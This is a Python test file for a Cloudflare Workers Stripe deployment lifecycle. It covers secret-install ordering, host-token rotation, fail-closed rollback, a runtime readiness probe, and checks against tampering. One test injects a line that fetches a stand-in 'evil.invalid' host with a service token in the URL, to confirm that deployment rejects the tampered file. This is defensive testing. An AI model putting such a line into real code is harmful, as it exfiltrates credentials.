"""WO-F4.1 Cloudflare Stripe activation ordering and rollback tests."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, cast

import httpx
import pytest
from disco.agent_server.appkit_cloudflare import deploy as cf
from disco.agent_server.appkit_cloudflare.stripe_deploy import (
    HttpStripeWorkerProbe,
    StripeDeployContext,
    StripeDeployDependencies,
    StripeDeployError,
    StripeDeploymentLifecycle,
)
from disco.agent_server.appkit_cloudflare.wrangler import (
    BuildResult,
    CommandResult,
)
from disco.agent_server.host_token_store import HostTokenStore
from disco.core.appkit import generate, get_recipe, save_app_spec, save_design_spec
from disco.core.appkit.records_primitive import default_records_auth_app_spec
from disco.core.appkit.spec import AppSpec, StripeMeta
from disco.core.appkit.stripe_primitive import StripeSpec, apply_stripe_spec
from disco.core.llm.secrets import SecretBox, SecretStore
from disco.core.stripe_host_service import (
    StripeAppConfigStore,
    configure_stripe_restricted_key,
    configure_stripe_webhook_secret,
    ensure_stripe_binding_secret,
)

_OWNER = "owner-1"
_CID = "11111111-1111-1111-1111-111111111111"
_AUDIENCE = "app_0123456789abcdef0123456789abcdef"
_ORIGIN = "https://stripe-test.workers.dev"
_ADMIN = "admin-token-with-enough-entropy-123"
_CF_TOKEN = "cfut_realCloudflareToken1234567890abcdefABCDEF"
_ACCOUNT = "abc123account456"
_DB_ID = "11111111-2222-3333-4444-555555555555"


class _Probe:
    def __init__(self, ready: bool = True) -> None:
        self.ready = ready
        self.calls: list[tuple[str, str]] = []

    async def payments_ready(self, deployed_origin: str, admin_token: str) -> bool:
        self.calls.append((deployed_origin, admin_token))
        return self.ready


class _SecretSink:
    def __init__(self, fail_at: int | None = None) -> None:
        self.fail_at = fail_at
        self.calls: list[tuple[str, str]] = []

    async def __call__(self, name: str, value: str) -> bool:
        self.calls.append((name, value))
        return self.fail_at != len(self.calls)


def _app() -> AppSpec:
    return AppSpec(
        schema_version=1,
        app_kind="records",
        name="Paid Records",
        roles=("member", "pro_member"),
        stripe=StripeMeta(
            app_binding=_AUDIENCE,
            plan_selector="pro_member",
            entitlement_flag="pro_member",
            success_message="Welcome to Pro.",
        ),
    )


@pytest.fixture
def stripe_runtime(tmp_path: Path, monkeypatch):  # noqa: ANN001
    monkeypatch.setenv("DISCO_SVC_BUS_PUBLIC_URL", "https://bus.example.test")
    secrets = SecretStore(
        tmp_path / "secrets.json",
        box=SecretBox("test-secret-with-enough-entropy-0123456789"),
    )
    configure_stripe_restricted_key(secrets, "rk_test_restricted_checkout_key")
    ensure_stripe_binding_secret(secrets, _OWNER, _AUDIENCE)
    configure_stripe_webhook_secret(secrets, _OWNER, _AUDIENCE, "whsec_test_deployment_signer")
    configs = StripeAppConfigStore(tmp_path / "stripe.db")
    configs.configure(
        owner_id=_OWNER,
        audience=_AUDIENCE,
        plan_selector="pro_member",
        stripe_price_id="price_123456789",
        allowed_return_origins=frozenset({_ORIGIN}),
        enabled=True,
        secret_store=secrets,
    )
    tokens = HostTokenStore(tmp_path / "tokens.db")
    yield secrets, configs, tokens
    tokens.close()
    configs.close()


async def test_lifecycle_installs_exact_order_and_rotates(stripe_runtime) -> None:  # noqa: ANN001
    secrets, configs, tokens = stripe_runtime
    old = tokens.mint(
        _CID,
        _OWNER,
        _AUDIENCE,
        allowed_services=frozenset({"payments.ready", "payments.checkout"}),
        allowed_origins=frozenset({_ORIGIN}),
        kind="deployed",
    )
    probe = _Probe()
    lifecycle = StripeDeploymentLifecycle(
        app_spec=_app(),
        owner_id=_OWNER,
        conversation_id=_CID,
        secret_store=secrets,
        config_store=configs,
        token_store=tokens,
        probe=probe,
    )
    sink = _SecretSink()
    token_mutations: list[str] = []
    await lifecycle.activate(
        deployed_url=_ORIGIN,
        admin_token=_ADMIN,
        fresh_worker=True,
        put_secret=sink,
        record_mutation=token_mutations.append,
    )
    assert [name for name, _value in sink.calls] == [
        "STRIPE_RUNTIME_READY",
        "ADMIN_TOKEN",
        "DISCO_SVC_BUS",
        "STRIPE_WEBHOOK_SECRET",
        "STRIPE_APP_BINDING_SECRET",
        "DISCO_SVC_TOKEN",
        "STRIPE_RUNTIME_READY",
    ]
    assert sink.calls[0][1] == "0" and sink.calls[-1][1] == "1"
    assert probe.calls == [(_ORIGIN, _ADMIN)]
    assert tokens.verify(old) is None
    active = [record for record in tokens.list_for_conversation(_CID) if record.is_active]
    assert len(active) == 1
    assert active[0].allowed_services == frozenset({"payments.ready", "payments.checkout"})
    assert active[0].allowed_origins == frozenset({_ORIGIN})
    assert token_mutations == [
        "host_token_candidate_mint_attempted",
        "host_token_candidate_minted",
        "host_token_rotation_finish_attempted",
        "host_token_rotation_finished",
    ]


@pytest.mark.parametrize("fail_at", range(1, 8))
async def test_every_secret_failure_fails_closed_and_never_exposes_values(
    stripe_runtime,
    fail_at: int,  # noqa: ANN001
) -> None:
    secrets, configs, tokens = stripe_runtime
    old = tokens.mint(
        _CID,
        _OWNER,
        _AUDIENCE,
        allowed_services=frozenset({"payments.ready"}),
        allowed_origins=frozenset({_ORIGIN}),
        kind="deployed",
    )
    lifecycle = StripeDeploymentLifecycle(
        app_spec=_app(),
        owner_id=_OWNER,
        conversation_id=_CID,
        secret_store=secrets,
        config_store=configs,
        token_store=tokens,
        probe=_Probe(),
    )
    sink = _SecretSink(fail_at)
    with pytest.raises(StripeDeployError) as caught:
        await lifecycle.activate(
            deployed_url=_ORIGIN,
            admin_token=_ADMIN,
            fresh_worker=True,
            put_secret=sink,
        )
    await lifecycle.fail_closed(sink)
    rendered = f"{caught.value.step} {caught.value.detail}"
    assert _ADMIN not in rendered
    assert all(value not in rendered for _name, value in sink.calls)
    # Before finish_rotation (steps 1-6), the old working token survives and any
    # candidate is revoked. READY=1 failure happens after the specified finish,
    # so the proven candidate remains the sole safe token while READY is reset 0.
    if fail_at < 7:
        assert tokens.verify(old) is not None
    else:
        assert tokens.verify(old) is None
        assert sink.calls[-1] == ("STRIPE_RUNTIME_READY", "0")


async def test_probe_failure_revokes_candidate_and_preserves_old(stripe_runtime) -> None:  # noqa: ANN001
    secrets, configs, tokens = stripe_runtime
    old = tokens.mint(
        _CID,
        _OWNER,
        _AUDIENCE,
        allowed_services=frozenset({"payments.ready"}),
        allowed_origins=frozenset({_ORIGIN}),
        kind="deployed",
    )
    lifecycle = StripeDeploymentLifecycle(
        app_spec=_app(),
        owner_id=_OWNER,
        conversation_id=_CID,
        secret_store=secrets,
        config_store=configs,
        token_store=tokens,
        probe=_Probe(False),
    )
    sink = _SecretSink()
    token_mutations: list[str] = []
    with pytest.raises(StripeDeployError, match="payments.ready"):
        await lifecycle.activate(
            deployed_url=_ORIGIN,
            admin_token=_ADMIN,
            fresh_worker=False,
            put_secret=sink,
            record_mutation=token_mutations.append,
        )
    await lifecycle.fail_closed(sink)
    assert tokens.verify(old) is not None
    records = tokens.list_for_conversation(_CID)
    assert len(records) == 2 and sum(record.is_active for record in records) == 1
    assert sink.calls[-1] == ("STRIPE_RUNTIME_READY", "0")
    assert token_mutations == [
        "host_token_candidate_mint_attempted",
        "host_token_candidate_minted",
        "host_token_candidate_revoke_attempted",
        "host_token_candidate_revoked",
    ]


@pytest.mark.parametrize("rollback_outcome", ["false", "exception"])
async def test_failed_ready_zero_rollback_surfaces_uncertain_manual_state(
    stripe_runtime,
    rollback_outcome: str,  # noqa: ANN001
) -> None:
    secrets, configs, tokens = stripe_runtime
    lifecycle = StripeDeploymentLifecycle(
        app_spec=_app(),
        owner_id=_OWNER,
        conversation_id=_CID,
        secret_store=secrets,
        config_store=configs,
        token_store=tokens,
        probe=_Probe(False),
    )

    class Writer:
        async def __call__(self, name: str, _value: str) -> bool:
            if name != "STRIPE_RUNTIME_READY":
                return True
            if rollback_outcome == "exception":
                raise RuntimeError("simulated ready-zero transport failure")
            return False

        def record_host_token_mutation(self, _name: str) -> None:
            return None

    error = await cf._activate_stripe_worker(
        lifecycle,
        deployed_url=_ORIGIN,
        admin_token=_ADMIN,
        fresh_worker=False,
        writer=cast(Any, Writer()),
    )
    assert error is not None
    assert error.step == "stripe_runtime_state_uncertain"
    assert "manual intervention is required" in error.detail


async def test_existing_worker_quiesce_failure_is_retried_fail_closed(stripe_runtime) -> None:  # noqa: ANN001
    secrets, configs, tokens = stripe_runtime
    lifecycle = StripeDeploymentLifecycle(
        app_spec=_app(),
        owner_id=_OWNER,
        conversation_id=_CID,
        secret_store=secrets,
        config_store=configs,
        token_store=tokens,
        probe=_Probe(),
    )
    sink = _SecretSink(fail_at=1)
    with pytest.raises(StripeDeployError):
        await lifecycle.quiesce_existing_worker(sink)
    await lifecycle.fail_closed(sink)
    assert sink.calls == [
        ("STRIPE_RUNTIME_READY", "0"),
        ("STRIPE_RUNTIME_READY", "0"),
    ]


def test_post_build_secret_or_config_drift_is_refused(stripe_runtime) -> None:  # noqa: ANN001
    secrets, configs, tokens = stripe_runtime
    lifecycle = StripeDeploymentLifecycle(
        app_spec=_app(),
        owner_id=_OWNER,
        conversation_id=_CID,
        secret_store=secrets,
        config_store=configs,
        token_store=tokens,
        probe=_Probe(),
    )
    configure_stripe_webhook_secret(
        secrets, _OWNER, _AUDIENCE, "whsec_rotated_during_untrusted_build"
    )
    with pytest.raises(StripeDeployError, match="changed"):
        lifecycle.recheck_after_build(_app())


@pytest.mark.parametrize(
    ("status", "content_type", "body", "expected"),
    [
        (200, "application/json", b'{"ready":true}', True),
        (302, "application/json", b'{"ready":true}', False),
        (200, "text/plain", b'{"ready":true}', False),
        (200, "application/json", b'{"ready":true,"extra":1}', False),
        (200, "application/json", b'{"ready":false,"ready":true}', False),
        (200, "application/json", b"{" + b"x" * 5000 + b"}", False),
    ],
)
async def test_http_runtime_probe_is_exact_bounded_and_admin_authenticated(
    status: int, content_type: str, body: bytes, expected: bool
) -> None:
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(status, headers={"content-type": content_type}, content=body)

    probe = HttpStripeWorkerProbe(transport=httpx.MockTransport(handler))
    assert await probe.payments_ready(_ORIGIN, _ADMIN) is expected
    assert len(seen) == 1
    assert seen[0].url == _ORIGIN + "/api/stripe/runtime-probe"
    assert seen[0].headers["authorization"] == f"Bearer {_ADMIN}"


@pytest.mark.integration
async def test_http_probe_drives_generated_worker_and_real_ready_bus(
    tmp_path: Path,
) -> None:
    """Production probe -> generated workerd Worker -> mocked payments.ready bus."""
    import os
    import select
    import shutil
    import ssl
    import subprocess
    import threading
    import urllib.error
    import urllib.request
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    wrangler_bin = shutil.which("wrangler")
    node_bin = shutil.which("node")
    npm_bin = shutil.which("npm")
    if wrangler_bin is None or node_bin is None or npm_bin is None:
        pytest.skip("node + npm + wrangler/workerd are required for the integrated runtime probe")
    recipe = get_recipe("editorial-ledger")
    assert recipe is not None
    stripe_spec = StripeSpec(
        plan_name="Pro",
        price_display="$9/mo",
        entitlement_flag="pro_member",
        success_message="Welcome to Pro.",
    )
    app = apply_stripe_spec(default_records_auth_app_spec("Probe", recipe), stripe_spec)
    tree = generate(app, recipe.to_design_spec())
    app_dir = tmp_path / "app"
    for relpath, contents in tree.items():
        target = app_dir / relpath
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(contents, encoding="utf-8")
    (app_dir / "dist").mkdir()
    (app_dir / "dist" / "index.html").write_text("<html></html>", encoding="utf-8")
    bundle_dir = tmp_path / "bundle"
    command_env = os.environ.copy()
    command_env["WRANGLER_SEND_METRICS"] = "false"
    install_result = subprocess.run(
        [npm_bin, "install", "--ignore-scripts", "--no-audit", "--no-fund"],
        cwd=app_dir,
        env=command_env,
        capture_output=True,
        text=True,
    )
    assert install_result.returncode == 0, (
        f"Generated app dependency install failed\nstdout={install_result.stdout}"
        f"\nstderr={install_result.stderr}"
    )
    bundle_result = subprocess.run(
        [
            wrangler_bin,
            "deploy",
            "--config",
            str(app_dir / "wrangler.toml"),
            "--dry-run",
            "--outdir",
            str(bundle_dir),
        ],
        cwd=app_dir,
        env=command_env,
        capture_output=True,
        text=True,
    )
    assert bundle_result.returncode == 0, (
        f"Wrangler build failed\nstdout={bundle_result.stdout}\nstderr={bundle_result.stderr}"
    )
    bundles = [*bundle_dir.rglob("*.js"), *bundle_dir.rglob("*.mjs")]
    assert len(bundles) == 1, bundles
    token = "a2v0." + "A" * 22 + "." + "B" * 43
    miniflare_entry = (
        Path(wrangler_bin).resolve().parents[1] / "node_modules/miniflare/dist/src/index.js"
    )
    assert miniflare_entry.exists()
    worker_port = _free_tcp_port()
    host_bus_worker = tmp_path / "host-bus.mjs"
    host_bus_worker.write_text(
        f"""export default {{
  async fetch(request) {{
    let body;
    try {{ body = await request.json(); }} catch {{ return Response.json({{ ready: false }}); }}
    const keys = body && typeof body === "object" ? Object.keys(body).sort() : [];
    const valid = new URL(request.url).pathname === "/_disco/svc/payments.ready"
      && request.method === "POST"
      && request.headers.get("authorization") === {json.dumps(f"Bearer {token}")}
      && keys.join(",") === "binding_proof,plan_selector,webhook_proof"
      && body.plan_selector === "pro_member"
      && /^[0-9a-f]{{64}}$/.test(body.binding_proof)
      && /^[0-9a-f]{{64}}$/.test(body.webhook_proof);
    return Response.json({{ ready: valid }});
  }},
}};
""",
        encoding="utf-8",
    )
    harness = tmp_path / "miniflare.mjs"
    harness.write_text(
        f"""import {{ Miniflare }} from {json.dumps(miniflare_entry.as_uri())};
const mf = new Miniflare({{
  host: "127.0.0.1", port: {worker_port},
  workers: [{{
    name: "stripe-app", modules: true,
    scriptPath: {json.dumps(str(bundles[0]))}, compatibilityDate: "2025-01-01",
    d1Databases: {{ DB: "stripe-probe-test" }}, outboundService: {{ name: "host-bus" }},
    bindings: {{
      ADMIN_TOKEN: {json.dumps(_ADMIN)},
      STRIPE_WEBHOOK_SECRET: "integration_webhook_secret",
      STRIPE_APP_BINDING_SECRET: "integration-binding-secret-at-least-32-bytes",
      STRIPE_RUNTIME_READY: "0", DISCO_SVC_BUS: "https://bus.example",
      DISCO_SVC_TOKEN: {json.dumps(token)},
    }},
  }}, {{
    name: "host-bus", modules: true,
    scriptPath: {json.dumps(str(host_bus_worker))}, compatibilityDate: "2025-01-01",
  }}],
}});
await mf.ready;
console.log("READY");
for (const signal of ["SIGTERM", "SIGINT"]) process.on(signal, async () => {{
  await mf.dispose(); process.exit(0);
}});
setInterval(() => {{}}, 1000);
""",
        encoding="utf-8",
    )
    node = subprocess.Popen(
        [node_bin, str(harness)],
        cwd=tmp_path,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        start_new_session=True,
    )
    assert node.stdout is not None
    readable, _, _ = select.select([node.stdout], [], [], 20)
    if not readable:
        node.terminate()
        stdout, stderr = node.communicate(timeout=10)
        raise AssertionError(f"Miniflare did not start\nstdout={stdout}\nstderr={stderr}")
    assert node.stdout.readline().strip() == "READY"
    cert = tmp_path / "cert.pem"
    key = tmp_path / "key.pem"
    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-newkey",
            "rsa:2048",
            "-nodes",
            "-days",
            "1",
            "-subj",
            "/CN=localhost",
            "-addext",
            "subjectAltName=DNS:localhost,IP:127.0.0.1",
            "-keyout",
            str(key),
            "-out",
            str(cert),
        ],
        check=True,
        capture_output=True,
    )
    tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    tls.load_cert_chain(cert, key)
    proxy_responses: list[tuple[int, bytes]] = []

    class ProxyHandler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            request = urllib.request.Request(
                f"http://127.0.0.1:{worker_port}{self.path}",
                headers={"Authorization": self.headers.get("authorization", "")},
            )
            try:
                with urllib.request.urlopen(request, timeout=10) as response:
                    status, body = response.status, response.read()
            except urllib.error.HTTPError as exc:
                status, body = exc.code, exc.read()
            proxy_responses.append((status, body))
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, _format: str, *_args: object) -> None:
            return None

    proxy = ThreadingHTTPServer(("127.0.0.1", 0), ProxyHandler)
    proxy.socket = tls.wrap_socket(proxy.socket, server_side=True)
    proxy_thread = threading.Thread(target=proxy.serve_forever, daemon=True)
    proxy_thread.start()
    proxy_port = int(proxy.server_address[1])
    try:
        probe = HttpStripeWorkerProbe(transport=httpx.AsyncHTTPTransport(verify=False))
        origin = f"https://localhost:{proxy_port}"
        assert await probe.payments_ready(origin, "wrong-admin-token") is False
        assert await probe.payments_ready(origin, _ADMIN) is True, proxy_responses
    finally:
        proxy.shutdown()
        proxy.server_close()
        proxy_thread.join(timeout=5)
        node.terminate()
        node.communicate(timeout=10)


def _free_tcp_port() -> int:
    import socket

    sock = socket.socket()
    try:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])
    finally:
        sock.close()


class _Runner:
    def __init__(self) -> None:
        self.calls: list[dict[str, object]] = []

    async def run(self, argv, *, cwd, env, stdin=None):  # noqa: ANN001
        self.calls.append({"argv": list(argv), "cwd": str(cwd), "env": dict(env), "stdin": stdin})
        sub = list(argv[1:])
        if sub[:2] == ["d1", "list"]:
            return CommandResult(0, "[]", "")
        if sub[:2] == ["d1", "create"]:
            return CommandResult(0, f'database_id = "{_DB_ID}"', "")
        if sub[:2] == ["deployments", "list"]:
            return CommandResult(0, "[]", "")
        if sub[:1] == ["deploy"]:
            return CommandResult(0, f"Published to {_ORIGIN}", "")
        return CommandResult(0, "ok", "")


class _Build:
    @property
    def isolates(self) -> bool:
        return True

    async def build(self, workspace, *, install_cmd, build_cmd, asset_dir="dist"):  # noqa: ANN001
        dest = workspace / asset_dir
        dest.mkdir(parents=True, exist_ok=True)
        (dest / "index.html").write_text("<html></html>", encoding="utf-8")
        return BuildResult(0, "built", "", True)


def _write_stripe_export(workspace: Path) -> AppSpec:
    recipe = get_recipe("editorial-ledger")
    assert recipe is not None
    base = default_records_auth_app_spec("Paid Records", recipe)
    stripe_spec = StripeSpec(
        plan_name="Pro",
        price_display="$9/mo",
        entitlement_flag="pro_member",
        success_message="Welcome to Pro.",
    )
    app = apply_stripe_spec(base, stripe_spec)
    design = recipe.to_design_spec()
    for rel, body in generate(app, design).items():
        dest = workspace / rel
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_text(body, encoding="utf-8")
    save_app_spec(workspace, app)
    save_design_spec(workspace, design)
    provenance = workspace / ".disco" / "primitives" / "stripe.json"
    provenance.parent.mkdir(parents=True, exist_ok=True)
    provenance.write_text(
        json.dumps(
            {
                "primitive_id": "stripe",
                "tier": "template_only",
                "applied_at": "2026-07-11T00:00:00Z",
                "spec": stripe_spec.model_dump(mode="json"),
            }
        ),
        encoding="utf-8",
    )
    return app


@pytest.mark.parametrize(
    ("relpath", "mutate"),
    [
        (
            "worker/disco-client.ts",
            lambda text: text + '\nfetch("https://evil.invalid/?token=" + env.DISCO_SVC_TOKEN);\n',
        ),
        (
            "wrangler.toml",
            lambda text: text.replace('main = "worker/index.ts"', 'main = "worker/evil.ts"'),
        ),
    ],
)
def test_exact_stripe_trusted_tree_rejects_host_client_and_entrypoint_tampering(
    tmp_path: Path,
    relpath: str,
    mutate,  # noqa: ANN001
) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    _write_stripe_export(workspace)
    target = workspace / relpath
    target.write_text(mutate(target.read_text(encoding="utf-8")), encoding="utf-8")
    with pytest.raises(cf.DeployRefused) as caught:
        cf._assert_stripe_trusted_tree(workspace)
    assert caught.value.reason is cf.RefusalReason.STRIPE_TRUSTED_TREE
    assert relpath in caught.value.detail


async def test_full_deploy_runner_order_and_records_contain_names_not_values(
    tmp_path: Path,
    monkeypatch,  # noqa: ANN001
) -> None:
    monkeypatch.setenv("DISCO_SVC_BUS_PUBLIC_URL", "https://bus.example.test")
    monkeypatch.setenv("DISCO_DEPLOY_LOCK_DIR", str(tmp_path / "locks"))
    monkeypatch.setenv("DISCO_DEPLOY_STAGE_DIR", str(tmp_path / "staging"))
    wrangler = tmp_path / "trusted" / "wrangler"
    wrangler.parent.mkdir()
    wrangler.write_text("#!/bin/sh\n", encoding="utf-8")
    monkeypatch.setenv("DISCO_WRANGLER_BIN", str(wrangler))
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    app = _write_stripe_export(workspace)
    assert app.stripe is not None
    secrets = SecretStore(
        tmp_path / "secrets.json", box=SecretBox("strong-app-key-0123456789abcdef")
    )
    cf.connect_account(secrets, token=_CF_TOKEN, account_id=_ACCOUNT)
    configure_stripe_restricted_key(secrets, "rk_test_restricted_checkout_key")
    ensure_stripe_binding_secret(secrets, _OWNER, app.stripe.app_binding)
    webhook = "whsec_never_record_this_deploy_value"
    configure_stripe_webhook_secret(secrets, _OWNER, app.stripe.app_binding, webhook)
    configs = StripeAppConfigStore(tmp_path / "stripe.db")
    configs.configure(
        owner_id=_OWNER,
        audience=app.stripe.app_binding,
        plan_selector=app.stripe.plan_selector,
        stripe_price_id="price_123456789",
        allowed_return_origins=frozenset({_ORIGIN}),
        enabled=True,
        secret_store=secrets,
    )
    tokens = HostTokenStore(tmp_path / "tokens.db")
    runner = _Runner()
    context = StripeDeployContext(StripeDeployDependencies(tokens, configs, _Probe()), _OWNER, _CID)
    plan = cf.build_plan(workspace, secrets)
    result = await cf.execute_deploy(
        workspace,
        secrets,
        dry_run=False,
        confirmation=plan.confirmation_phrase,
        runner=runner,
        build_backend=_Build(),
        admin_token=_ADMIN,
        stripe_context=context,
    )
    assert result.succeeded and result.executed
    puts = [
        list(call["argv"])[-1]
        for call in runner.calls
        if list(call["argv"])[1:3] == ["secret", "put"]
    ]
    assert puts == [
        "STRIPE_RUNTIME_READY",
        "ADMIN_TOKEN",
        "DISCO_SVC_BUS",
        "STRIPE_WEBHOOK_SECRET",
        "STRIPE_APP_BINDING_SECRET",
        "DISCO_SVC_TOKEN",
        "STRIPE_RUNTIME_READY",
    ]
    persisted = Path(result.record_path or "").read_text(encoding="utf-8")
    rendered = json.dumps(result.transcript) + persisted
    assert webhook not in rendered and _ADMIN not in rendered
    assert "secret_put:STRIPE_WEBHOOK_SECRET" in persisted
    assert "secret_put_attempt:STRIPE_WEBHOOK_SECRET" in persisted
    assert "host_token_candidate_mint_attempted" in persisted
    assert "host_token_candidate_minted" in persisted
    assert "host_token_rotation_finish_attempted" in persisted
    assert "host_token_rotation_finished" in persisted
    assert "a2v0." not in persisted
    tokens.close()
    configs.close()
